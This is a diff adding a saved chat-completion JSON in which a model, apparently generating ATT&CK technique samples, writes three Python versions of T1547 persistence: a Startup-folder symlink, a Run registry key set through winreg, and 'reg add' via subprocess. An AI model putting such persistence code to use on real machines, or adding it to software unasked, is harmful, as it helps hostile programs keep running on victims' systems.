@@ -1,0 +1,21 @@
+{
+  "id":"chatcmpl-8MbLdhGJ30LgtZ8bDXCgZFpMCbUNN",
+  "object":"chat.completion",
+  "created":1700397473,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[可實現]\n使用 Python 實現 T1547 的 Boot or Logon Autostart Execution，以下是三種不同的寫法：\n\n寫法一：\nimport os\n\ndef add_to_startup(program_path):\n    startup_path = os.path.join(os.getenv(\"APPDATA\"), \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")\n    os.makedirs(startup_path, exist_ok=True)\n    os.symlink(program_path, os.path.join(startup_path, os.path.basename(program_path)))\n\n# 呼叫這個 function 來將程式加入到啟動時執行\nadd_to_startup(\"C:\\\\path\\\\to\\\\my_program.exe\")\n\n\n寫法二：\nimport winreg\n\ndef add_to_startup(program_path):\n    startup_key = winreg.HKEY_CURRENT_USER\n    with winreg.OpenKey(startup_key, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, winreg.KEY_ALL_ACCESS) as key:\n        winreg.SetValueEx(key, \"MyProgram\", 0, winreg.REG_SZ, program_path)\n\n# 呼叫這個 function 來將程式加入到啟動時執行\nadd_to_startup(\"C:\\\\path\\\\to\\\\my_program.exe\")\n\n\n寫法三：\nimport subprocess\n\ndef add_to_startup(program_path):\n    subprocess.run(['reg', 'add', 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', '/v', 'MyProgram', '/t', 'REG_SZ', '/d', f'\"{program_path}\"', '/f'])\n\n# 呼叫這個 function 來將程式加入到啟動時執行\nadd_to_startup(\"C:\\\\path\\\\to\\\\my_program.exe\")"
+      },
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":1863,
+    "completion_tokens":392,
+    "total_tokens":2255
+  }
+}
